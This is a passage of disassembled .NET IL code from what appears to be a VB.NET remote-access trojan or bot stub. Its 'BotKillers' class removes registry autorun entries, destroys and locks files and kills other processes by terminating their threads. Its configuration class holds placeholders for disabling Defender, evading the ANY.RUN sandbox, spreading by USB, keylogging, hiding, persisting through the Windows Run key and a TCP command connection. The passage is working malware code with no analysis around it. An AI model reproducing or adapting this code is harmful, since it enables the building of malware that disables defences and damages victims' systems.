      IL_0104:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0109:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_010e:  leave.s    IL_0110

    }  // end handler
    IL_0110:  ret
  } // end of method BotKillers::StartupFucker

  .method public static void  RemoveKey(int32 Reg,
                                        string file,
                                        string reglocation,
                                        string FileLocation) cil managed
  {
    // Code size       75 (0x4b)
    .maxstack  3
    .locals init (string V_0,
             class [mscorlib]Microsoft.Win32.RegistryKey V_1,
             class [mscorlib]Microsoft.Win32.RegistryKey V_2)
    .try
    {
      IL_0000:  ldarg.2
      IL_0001:  stloc.0
      IL_0002:  ldnull
      IL_0003:  stloc.1
      IL_0004:  ldarg.0
      IL_0005:  ldc.i4.1
      IL_0006:  bne.un.s   IL_0017

      IL_0008:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
      IL_000d:  ldloc.0
      IL_000e:  ldc.i4.1
      IL_000f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0014:  stloc.1
      IL_0015:  br.s       IL_0024

      IL_0017:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::LocalMachine
      IL_001c:  ldloc.0
      IL_001d:  ldc.i4.1
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0023:  stloc.1
      IL_0024:  ldloc.1
      IL_0025:  stloc.2
      .try
      {
        IL_0026:  ldloc.1
        IL_0027:  brfalse.s  IL_0030

        IL_0029:  ldloc.1
        IL_002a:  ldarg.1
        IL_002b:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string)
        IL_0030:  leave.s    IL_003c

      }  // end .try
      finally
      {
        IL_0032:  ldloc.2
        IL_0033:  brfalse.s  IL_003b

        IL_0035:  ldloc.2
        IL_0036:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_003b:  endfinally
      }  // end handler
      IL_003c:  leave.s    IL_004a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0043:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0048:  leave.s    IL_004a

    }  // end handler
    IL_004a:  ret
  } // end of method BotKillers::RemoveKey

  .method public static void  DestroyFile(string path) cil managed noinlining nooptimization
  {
    // Code size       157 (0x9d)
    .maxstack  6
    .locals init (class [mscorlib]System.Random V_0,
             class [mscorlib]System.Security.AccessControl.DirectorySecurity V_1)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0006:  brfalse    IL_008e

      IL_000b:  newobj     instance void [mscorlib]System.Random::.ctor()
      IL_0010:  stloc.0
      .try
      {
        IL_0011:  ldarg.0
        IL_0012:  call       void BotKillers::AllowAccess(string)
        IL_0017:  call       class My.MyComputer My.MyProject::get_Computer()
        IL_001c:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
        IL_0021:  ldarg.0
        IL_0022:  call       string [mscorlib]System.IO.Path::GetTempPath()
        IL_0027:  ldloc.0
        IL_0028:  ldc.i4     0x2710
        IL_002d:  ldc.i4     0x15f90
        IL_0032:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                          int32)
        IL_0037:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
        IL_003c:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0041:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::MoveFile(string,
                                                                                                                             string)
        IL_0046:  ldarg.0
        IL_0047:  ldsfld     string [mscorlib]System.String::Empty
        IL_004c:  call       void [mscorlib]System.IO.File::WriteAllText(string,
                                                                         string)
        IL_0051:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.FileSystem::FreeFile()
        IL_0056:  ldarg.0
        IL_0057:  ldc.i4.1
        IL_0058:  ldc.i4.m1
        IL_0059:  ldc.i4.0
        IL_005a:  ldc.i4.m1
        IL_005b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.FileSystem::FileOpen(int32,
                                                                                                    string,
                                                                                                    valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.OpenMode,
                                                                                                    valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.OpenAccess,
                                                                                                    valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.OpenShare,
                                                                                                    int32)
        IL_0060:  ldarg.0
        IL_0061:  call       void BotKillers::KillFile(string)
        IL_0066:  leave.s    IL_008e

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0068:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_006d:  ldarg.0
        IL_006e:  newobj     instance void [mscorlib]System.IO.DirectoryInfo::.ctor(string)
        IL_0073:  newobj     instance void [mscorlib]System.Security.AccessControl.DirectorySecurity::.ctor()
        IL_0078:  stloc.1
        IL_0079:  ldloc.1
        IL_007a:  ldc.i4.1
        IL_007b:  ldc.i4.0
        IL_007c:  callvirt   instance void [mscorlib]System.Security.AccessControl.ObjectSecurity::SetAccessRuleProtection(bool,
                                                                                                                           bool)
        IL_0081:  ldloc.1
        IL_0082:  callvirt   instance void [mscorlib]System.IO.DirectoryInfo::SetAccessControl(class [mscorlib]System.Security.AccessControl.DirectorySecurity)
        IL_0087:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_008c:  leave.s    IL_008e

      }  // end handler
      IL_008e:  leave.s    IL_009c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0090:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0095:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_009a:  leave.s    IL_009c

    }  // end handler
    IL_009c:  ret
  } // end of method BotKillers::DestroyFile

  .method public static bool  IsAdmin() cil managed
  {
    // Code size       41 (0x29)
    .maxstack  2
    .locals init (bool V_0,
             class [mscorlib]System.Security.Principal.WindowsIdentity V_1)
    .try
    {
      IL_0000:  call       class [mscorlib]System.Security.Principal.WindowsIdentity [mscorlib]System.Security.Principal.WindowsIdentity::GetCurrent()
      IL_0005:  stloc.1
      IL_0006:  ldloc.1
      IL_0007:  newobj     instance void [mscorlib]System.Security.Principal.WindowsPrincipal::.ctor(class [mscorlib]System.Security.Principal.WindowsIdentity)
      IL_000c:  ldc.i4     0x220
      IL_0011:  callvirt   instance bool [mscorlib]System.Security.Principal.WindowsPrincipal::IsInRole(valuetype [mscorlib]System.Security.Principal.WindowsBuiltInRole)
      IL_0016:  stloc.0
      IL_0017:  leave.s    IL_0027

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0019:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001e:  ldc.i4.0
      IL_001f:  stloc.0
      IL_0020:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0025:  leave.s    IL_0027

    }  // end handler
    IL_0027:  ldloc.0
    IL_0028:  ret
  } // end of method BotKillers::IsAdmin

  .method public static void  AllowAccess(string location) cil managed
  {
    // Code size       43 (0x2b)
    .maxstack  4
    .locals init (string V_0,
             class [mscorlib]System.Security.AccessControl.DirectorySecurity V_1)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  stloc.0
      IL_0002:  ldloc.0
      IL_0003:  newobj     instance void [mscorlib]System.IO.DirectoryInfo::.ctor(string)
      IL_0008:  newobj     instance void [mscorlib]System.Security.AccessControl.DirectorySecurity::.ctor()
      IL_000d:  stloc.1
      IL_000e:  ldloc.1
      IL_000f:  ldc.i4.0
      IL_0010:  ldc.i4.1
      IL_0011:  callvirt   instance void [mscorlib]System.Security.AccessControl.ObjectSecurity::SetAccessRuleProtection(bool,
                                                                                                                         bool)
      IL_0016:  ldloc.1
      IL_0017:  callvirt   instance void [mscorlib]System.IO.DirectoryInfo::SetAccessControl(class [mscorlib]System.Security.AccessControl.DirectorySecurity)
      IL_001c:  leave.s    IL_002a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_001e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0023:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0028:  leave.s    IL_002a

    }  // end handler
    IL_002a:  ret
  } // end of method BotKillers::AllowAccess

  .method public static void  TerminateProcessPath(string Path) cil managed
  {
    // Code size       196 (0xc4)
    .maxstack  4
    .locals init (class [System]System.Diagnostics.Process[] V_0,
             string[] V_1,
             int32 V_2,
             string V_3,
             int32 V_4,
             int32 V_5,
             class [System]System.Diagnostics.Process V_6)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0006:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_000b:  callvirt   instance string [mscorlib]System.String::ToString()
      IL_0010:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0015:  brtrue     IL_00b5

      IL_001a:  ldarg.0
      IL_001b:  ldstr      "\\"
      IL_0020:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0025:  brfalse.s  IL_0057

      IL_0027:  ldarg.0
      IL_0028:  ldstr      "\\"
      IL_002d:  ldc.i4.m1
      IL_002e:  ldc.i4.0
      IL_002f:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_0034:  stloc.1
      IL_0035:  ldc.i4.0
      IL_0036:  stloc.2
      IL_0037:  br.s       IL_0051

      IL_0039:  ldloc.1
      IL_003a:  ldloc.2
      IL_003b:  ldelem.ref
      IL_003c:  stloc.3
      IL_003d:  ldloc.3
      IL_003e:  ldstr      ".exe"
      IL_0043:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0048:  brfalse.s  IL_004d

      IL_004a:  ldloc.3
      IL_004b:  starg.s    Path
      IL_004d:  ldloc.2
      IL_004e:  ldc.i4.1
      IL_004f:  add.ovf
      IL_0050:  stloc.2
      IL_0051:  ldloc.2
      IL_0052:  ldloc.1
      IL_0053:  ldlen
      IL_0054:  conv.i4
      IL_0055:  blt.s      IL_0039

      IL_0057:  ldarg.0
      IL_0058:  ldstr      ".exe"
      IL_005d:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0062:  brfalse.s  IL_0076

      IL_0064:  ldarg.0
      IL_0065:  ldstr      ".exe"
      IL_006a:  ldsfld     string [mscorlib]System.String::Empty
      IL_006f:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0074:  starg.s    Path
      IL_0076:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcesses()
      IL_007b:  stloc.0
      IL_007c:  ldloc.0
      IL_007d:  ldlen
      IL_007e:  conv.i4
      IL_007f:  ldc.i4.1
      IL_0080:  sub.ovf
      IL_0081:  stloc.s    V_4
      IL_0083:  ldc.i4.0
      IL_0084:  stloc.s    V_5
      IL_0086:  br.s       IL_00af

      IL_0088:  ldloc.0
      IL_0089:  ldloc.s    V_5
      IL_008b:  ldelem.ref
      IL_008c:  stloc.s    V_6
      IL_008e:  ldloc.s    V_6
      IL_0090:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_0095:  ldarg.0
      IL_0096:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_009b:  brfalse.s  IL_00a9

      IL_009d:  ldloc.s    V_6
      IL_009f:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
      IL_00a4:  call       void BotKillers::TerminateProcess(int32)
      IL_00a9:  ldloc.s    V_5
      IL_00ab:  ldc.i4.1
      IL_00ac:  add.ovf
      IL_00ad:  stloc.s    V_5
      IL_00af:  ldloc.s    V_5
      IL_00b1:  ldloc.s    V_4
      IL_00b3:  ble.s      IL_0088

      IL_00b5:  leave.s    IL_00c3

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00bc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c1:  leave.s    IL_00c3

    }  // end handler
    IL_00c3:  ret
  } // end of method BotKillers::TerminateProcessPath

  .method public static void  TerminateProcess(int32 PID) cil managed
  {
    // Code size       147 (0x93)
    .maxstack  3
    .locals init (class [System]System.Diagnostics.Process V_0,
             class [mscorlib]System.Collections.IEnumerator V_1,
             class [System]System.Diagnostics.ProcessThread V_2,
             native int V_3)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0006:  stloc.0
      IL_0007:  ldloc.0
      IL_0008:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_000d:  ldsfld     string [mscorlib]System.String::Empty
      IL_0012:  ldc.i4.0
      IL_0013:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0018:  brfalse.s  IL_0084

      .try
      {
        IL_001a:  ldloc.0
        IL_001b:  callvirt   instance class [System]System.Diagnostics.ProcessThreadCollection [System]System.Diagnostics.Process::get_Threads()
        IL_0020:  callvirt   instance class [mscorlib]System.Collections.IEnumerator [mscorlib]System.Collections.ReadOnlyCollectionBase::GetEnumerator()
        IL_0025:  stloc.1
        IL_0026:  br.s       IL_0066

        IL_0028:  ldloc.1
        IL_0029:  callvirt   instance object [mscorlib]System.Collections.IEnumerator::get_Current()
        IL_002e:  castclass  [System]System.Diagnostics.ProcessThread
        IL_0033:  stloc.2
        IL_0034:  ldc.i4.3
        IL_0035:  ldc.i4.1
        IL_0036:  ldloc.2
        IL_0037:  callvirt   instance int32 [System]System.Diagnostics.ProcessThread::get_Id()
        IL_003c:  conv.ovf.u4
        IL_003d:  call       native int BotKillers::OpenThread(valuetype BotKillers/ThreadAccess,
                                                               bool,
                                                               uint32)
        IL_0042:  stloc.3
        IL_0043:  ldloc.3
        IL_0044:  ldsfld     native int [mscorlib]System.IntPtr::Zero
        IL_0049:  call       bool [mscorlib]System.IntPtr::op_Inequality(native int,
                                                                         native int)
        IL_004e:  brfalse.s  IL_0066

        IL_0050:  ldloc.3
        IL_0051:  call       int32 BotKillers::SuspendThread(native int)
        IL_0056:  pop
        IL_0057:  ldloc.3
        IL_0058:  ldc.i4.1
        IL_0059:  call       bool BotKillers::TerminateThread(native int,
                                                              uint32)
        IL_005e:  pop
        IL_005f:  ldloc.3
        IL_0060:  call       bool BotKillers::CloseHandle(native int)
        IL_0065:  pop
        IL_0066:  ldloc.1
        IL_0067:  callvirt   instance bool [mscorlib]System.Collections.IEnumerator::MoveNext()
        IL_006c:  brtrue.s   IL_0028

        IL_006e:  leave.s    IL_0084

      }  // end .try
      finally
      {
        IL_0070:  ldloc.1
        IL_0071:  isinst     [mscorlib]System.IDisposable
        IL_0076:  brfalse.s  IL_0083

        IL_0078:  ldloc.1
        IL_0079:  isinst     [mscorlib]System.IDisposable
        IL_007e:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_0083:  endfinally
      }  // end handler
      IL_0084:  leave.s    IL_0092

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0086:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_008b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0090:  leave.s    IL_0092

    }  // end handler
    IL_0092:  ret
  } // end of method BotKillers::TerminateProcess

  .method private static pinvokeimpl("kernel32.dll" lasterr winapi) 
          bool  CloseHandle(native int hHandle) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("kernel32.dll" winapi) 
          native int  OpenThread(valuetype BotKillers/ThreadAccess dwDesiredAccess,
                                 bool bInheritHandle,
                                 uint32 dwThreadId) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("kernel32.dll" lasterr winapi) 
          int32  SuspendThread(native int hThread) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("kernel32.dll" winapi) 
          bool  TerminateThread(native int hThread,
                                uint32 dwExitCode) cil managed preservesig
  {
  }
} // end of class BotKillers

.class private auto ansi sealed beforefieldinit j.OK
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .class auto ansi sealed nested public TernaryRasterOperations
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCCOPY = int32(0x00CC0020)
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCPAINT = int32(0x00EE0086)
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCAND = int32(0x008800C6)
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCINVERT = int32(0x00660046)
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCERASE = int32(0x00440328)
    .field public static literal valuetype j.OK/TernaryRasterOperations NOTSRCCOPY = int32(0x00330008)
    .field public static literal valuetype j.OK/TernaryRasterOperations NOTSRCERASE = int32(0x001100A6)
    .field public static literal valuetype j.OK/TernaryRasterOperations MERGECOPY = int32(0x00C000CA)
    .field public static literal valuetype j.OK/TernaryRasterOperations MERGEPAINT = int32(0x00BB0226)
    .field public static literal valuetype j.OK/TernaryRasterOperations PATCOPY = int32(0x00F00021)
    .field public static literal valuetype j.OK/TernaryRasterOperations PATPAINT = int32(0x00FB0A09)
    .field public static literal valuetype j.OK/TernaryRasterOperations PATINVERT = int32(0x005A0049)
    .field public static literal valuetype j.OK/TernaryRasterOperations DSTINVERT = int32(0x00550009)
    .field public static literal valuetype j.OK/TernaryRasterOperations BLACKNESS = int32(0x00000042)
    .field public static literal valuetype j.OK/TernaryRasterOperations WHITENESS = int32(0x00FF0062)
  } // end of class TernaryRasterOperations

  .class auto ansi sealed nested private SW
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype j.OK/SW Hide = int32(0x00000000)
    .field public static literal valuetype j.OK/SW Normal = int32(0x00000001)
    .field public static literal valuetype j.OK/SW ShowMinimized = int32(0x00000002)
    .field public static literal valuetype j.OK/SW ShowMaximized = int32(0x00000003)
    .field public static literal valuetype j.OK/SW ShowNoActivate = int32(0x00000004)
    .field public static literal valuetype j.OK/SW Show = int32(0x00000005)
    .field public static literal valuetype j.OK/SW Minimize = int32(0x00000006)
    .field public static literal valuetype j.OK/SW ShowMinNoActive = int32(0x00000007)
    .field public static literal valuetype j.OK/SW ShowNA = int32(0x00000008)
    .field public static literal valuetype j.OK/SW Restore = int32(0x00000009)
    .field public static literal valuetype j.OK/SW ShowDefault = int32(0x0000000A)
    .field public static literal valuetype j.OK/SW ForceMinimize = int32(0x0000000B)
    .field public static literal valuetype j.OK/SW Max = int32(0x0000000B)
  } // end of class SW

  .class auto ansi sealed nested private GetWindow_Cmd
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDFIRST = uint32(0x00000000)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDLAST = uint32(0x00000001)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDNEXT = uint32(0x00000002)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDPREV = uint32(0x00000003)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_OWNER = uint32(0x00000004)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_CHILD = uint32(0x00000005)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_ENABLEDPOPUP = uint32(0x00000006)
  } // end of class GetWindow_Cmd

  .field private class [mscorlib]System.Threading.Thread MouseThread
  .field private static literal int32 SRCCOPY = int32(0x00CC0020)
  .field private class [mscorlib]System.Random r
  .field public static string BinaryPath
  .field public static class [mscorlib]System.Collections.Generic.List`1<string> List
  .field public static class [mscorlib]System.Threading.Mutex _appMutex
  .field public static string sp
  .field public static string MTX
  .field public static bool DisKey
  .field public static bool PasteE
  .field public static string PASTEBIN
  .field public static string exlude
  .field public static string murderdefender
  .field public static bool Sched
  .field public static string SCHEDNAME
  .field public static bool ANYRUN
  .field public static string Bypass
  .field public static bool TaskMGR
  .field public static bool Melty
  .field public static bool KProc
  .field public static string Proc
  .field public static string SLP
  .field private static uint8[] b
  .field public static bool BD
  .field public static class [System]System.Net.Sockets.TcpClient C
  .field public static bool Cn
  .field public static string DR
  .field public static string SCREAM
  .field public static string WINMIN
  .field public static string EXE
  .field public static class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer F
  .field public static class [mscorlib]System.IO.FileStream FS
  .field public static string H
  .field public static bool Idr
  .field public static bool Anti_CH
  .field public static bool IsF
  .field public static bool USB_SP
  .field public static bool Isu
  .field public static class j.kl kq
  .field private static string lastcap
  .field public static class [mscorlib]System.IO.FileInfo LO
  .field private static class [mscorlib]System.IO.MemoryStream MeM
  .field public static object MT
  .field public static string P
  .field public static object PLG
  .field public static string RG
  .field public static string sf
  .field public static string VN
  .field public static string NTTA
  .field public static string VR
  .field public static string Y
  .field public static bool BOT_KILL
  .field public static bool HIDE_ME
  .field public static bool Persis
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       526 (0x20e)
    .maxstack  1
    IL_0000:  ldstr      "[DisKey]"
    IL_0005:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_000a:  stsfld     bool j.OK::DisKey
    IL_000f:  ldstr      "[PasteE]"
    IL_0014:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0019:  stsfld     bool j.OK::PasteE
    IL_001e:  ldstr      "[PASTEBIN]"
    IL_0023:  stsfld     string j.OK::PASTEBIN
    IL_0028:  ldstr      "[EXCLUDE]"
    IL_002d:  stsfld     string j.OK::exlude
    IL_0032:  ldstr      "[BYEDEFENDER]"
    IL_0037:  stsfld     string j.OK::murderdefender
    IL_003c:  ldstr      "[Sched]"
    IL_0041:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0046:  stsfld     bool j.OK::Sched
    IL_004b:  ldstr      "[SCHEDNAME]"
    IL_0050:  stsfld     string j.OK::SCHEDNAME
    IL_0055:  ldstr      "[ANYRUN]"
    IL_005a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_005f:  stsfld     bool j.OK::ANYRUN
    IL_0064:  ldstr      "[Bypass]"
    IL_0069:  stsfld     string j.OK::Bypass
    IL_006e:  ldstr      "[TaskMGR]"
    IL_0073:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0078:  stsfld     bool j.OK::TaskMGR
    IL_007d:  ldstr      "[Melty]"
    IL_0082:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0087:  stsfld     bool j.OK::Melty
    IL_008c:  ldstr      "[KProc]"
    IL_0091:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0096:  stsfld     bool j.OK::KProc
    IL_009b:  ldstr      "[Proc]"
    IL_00a0:  stsfld     string j.OK::Proc
    IL_00a5:  ldstr      "[SLP]"
    IL_00aa:  stsfld     string j.OK::SLP
    IL_00af:  ldc.i4     0x1401
    IL_00b4:  newarr     [mscorlib]System.Byte
    IL_00b9:  stsfld     uint8[] j.OK::b
    IL_00be:  ldstr      "[BD]"
    IL_00c3:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00c8:  stsfld     bool j.OK::BD
    IL_00cd:  ldnull
    IL_00ce:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
    IL_00d3:  ldc.i4.0
    IL_00d4:  stsfld     bool j.OK::Cn
    IL_00d9:  ldstr      "[DR]"
    IL_00de:  stsfld     string j.OK::DR
    IL_00e3:  ldstr      "off"
    IL_00e8:  stsfld     string j.OK::SCREAM
    IL_00ed:  ldstr      "off"
    IL_00f2:  stsfld     string j.OK::WINMIN
    IL_00f7:  ldstr      "[EXE]"
    IL_00fc:  stsfld     string j.OK::EXE
    IL_0101:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0106:  stsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_010b:  ldstr      "[H]"
    IL_0110:  stsfld     string j.OK::H
    IL_0115:  ldstr      "[Idr]"
    IL_011a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_011f:  stsfld     bool j.OK::Idr
    IL_0124:  ldstr      "[Anti_CH]"
    IL_0129:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_012e:  stsfld     bool j.OK::Anti_CH
    IL_0133:  ldstr      "[Isf]"
    IL_0138:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_013d:  stsfld     bool j.OK::IsF
    IL_0142:  ldstr      "[USB_SP]"
    IL_0147:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_014c:  stsfld     bool j.OK::USB_SP
    IL_0151:  ldstr      "[Isu]"
    IL_0156:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_015b:  stsfld     bool j.OK::Isu
    IL_0160:  ldnull
    IL_0161:  stsfld     class j.kl j.OK::kq
    IL_0166:  ldstr      ""
    IL_016b:  stsfld     string j.OK::lastcap
    IL_0170:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetEntryAssembly()
    IL_0175:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
    IL_017a:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_017f:  stsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0184:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_0189:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
    IL_018e:  ldnull
    IL_018f:  stsfld     object j.OK::MT
    IL_0194:  ldstr      "[P]"
    IL_0199:  stsfld     string j.OK::P
    IL_019e:  ldnull
    IL_019f:  stsfld     object j.OK::PLG
    IL_01a4:  ldstr      "[EXE]"
    IL_01a9:  stsfld     string j.OK::RG
    IL_01ae:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    IL_01b3:  stsfld     string j.OK::sf
    IL_01b8:  ldstr      "[VN]"
    IL_01bd:  stsfld     string j.OK::VN
    IL_01c2:  ldstr      "WhyYouReverseMe..ImInnocent..LoveYouu.."
    IL_01c7:  stsfld     string j.OK::NTTA
    IL_01cc:  ldstr      "Platinum"
    IL_01d1:  stsfld     string j.OK::VR
    IL_01d6:  ldstr      "[Y]"
    IL_01db:  stsfld     string j.OK::Y
    IL_01e0:  ldstr      "[BOTKILL]"
    IL_01e5:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_01ea:  stsfld     bool j.OK::BOT_KILL
    IL_01ef:  ldstr      "[HIDE_ME]"
    IL_01f4:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_01f9:  stsfld     bool j.OK::HIDE_ME
    IL_01fe:  ldstr      "[Persis]"
    IL_0203:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0208:  stsfld     bool j.OK::Persis
    IL_020d:  ret
  } // end of method OK::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       30 (0x1e)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
